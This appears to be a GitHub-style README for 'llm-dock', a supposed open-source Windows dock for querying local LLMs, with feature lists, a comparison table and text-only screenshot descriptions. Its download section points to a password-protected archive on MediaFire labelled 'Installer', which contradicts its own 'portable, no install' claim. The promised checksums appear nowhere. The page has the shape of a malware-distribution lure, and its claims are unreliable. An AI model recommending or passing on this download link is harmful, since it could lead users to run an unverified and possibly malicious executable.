# llm-dock

⚓ Free, open-source floating Q&A dock for Windows — summon local LLM over any app, keep it pinned. 100 MB portable, offline, MIT, no account.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Summon hotkey** — a slim prompt bar appears over any app; escape dismisses it without a trace
- ✅ **Drop-to-ask** — drag selected text or a whole file onto the dock for an immediate question
- ✅ **Sticky mini chat** — conversation stays pinned beside your work instead of covering it
- ✅ **Model quick-switch** — three pinned models in the dock menu for fast small versus heavy calls
- ✅ **Clipboard answers** — copy button grabs code or text straight into whatever you are doing
- ✅ **Under 90 MB of RAM** — it is a thin client, not a second browser eating your evening
- ✅ **100 MB self-contained exe** — runtime bundled, connects to any local server, offline, MIT

## Why llm-dock

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **llm-dock** | LM Studio chat | Open WebUI | ChatGPT desktop |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free, OSS | Free tier |
| Open source | **Yes** | No | Yes | No |
| Summon-over-any-app bar | **Yes** | No | No | Partial
| Drop text or file to ask | **Yes** | No | No | Partial
| RAM footprint | **Under 90 MB** | Heavy | Browser weight | Electron heavy
| Portable, no install | **Yes, 100 MB** | Installer | Docker | Installer

## FAQ

**quickest way to ask a local LLM a question while working in another app?**

Alt-tabbing into a big chat app breaks focus and eats RAM. llm-dock is a slim bar summoned over the current window, takes dropped text or files and answers from your local server. It is a 100 MB portable exe, MIT, offline, and fits beside your editor instead of over it.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark dock (#121417, violet #8B5CF6): slim bar at screen bottom over an editor, question field active, answer popover with copy and expand buttons above it.
2. Drop interaction: file chip named contract.pdf resting on the dock, processing shimmer, suggested asks listed as three quick buttons.
3. Dock menu open: three pinned models with speed notes, sticky mode toggle on, settings row for server address, RAM usage chip reading 84 MB.

## Download

| Source | Link |
|---|---|
| 💾 **Installer llm-dock** | [Installer llm-dock](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).